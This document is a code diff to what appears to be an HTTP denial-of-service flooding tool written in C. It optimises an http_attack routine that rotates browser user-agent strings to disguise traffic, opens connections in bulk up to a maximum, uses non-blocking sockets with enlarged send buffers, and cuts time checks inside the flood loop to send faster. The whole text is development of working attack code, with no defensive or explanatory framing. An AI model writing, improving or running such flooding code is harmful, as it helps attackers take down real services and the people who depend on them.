@@ -3,7 +3,6 @@
 #include <stdio.h>
 #include <string.h>
 #include <time.h>
-#include <fcntl.h>
 #include <errno.h>
 #include <unistd.h>
 #include <sys/time.h>
@@ -41,14 +40,6 @@ static const char* USER_AGENTS[] = {
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0"
 };
 #define NUM_USER_AGENTS (sizeof(USER_AGENTS) / sizeof(USER_AGENTS[0]))
-
-static void set_socket_options(int sock) {
-    int flags = fcntl(sock, F_GETFL, 0);
-    fcntl(sock, F_SETFL, flags | O_NONBLOCK);
-
-    int sndbuf = 512 * 1024;
-    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
-}
 
 static int parse_method_option(const char* method_str) {
     if (!method_str) return -1;
@@ -192,18 +183,20 @@ void* http_attack(void* arg) {
     int sockets[MAX_CONNECTIONS] = {0};
     int active_sockets = 0;
 
-    srand(time(NULL) ^ (unsigned int)getpid());
     time_t end_time = time(NULL) + params->duration;
     struct timeval last_cleanup = {0, 0};
     uint32_t variant_idx = 0;
+    uint64_t iter = 0;
 
-    while (params->active && time(NULL) < end_time) {
+    while (params->active) {
+        if ((++iter & 0x3F) == 0 && time(NULL) >= end_time) break;
         // Open connections in bulk
         while (active_sockets < MAX_CONNECTIONS) {
-            int sock = socket(AF_INET, SOCK_STREAM, 0);
+            int sock = socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK, 0);
             if (sock < 0) break;
 
-            set_socket_options(sock);
+            int sndbuf = 512 * 1024;
+            setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
 
             int ret = connect(sock, (struct sockaddr*)&target_addr, sizeof(target_addr));
             if (ret < 0 && errno != EINPROGRESS) {
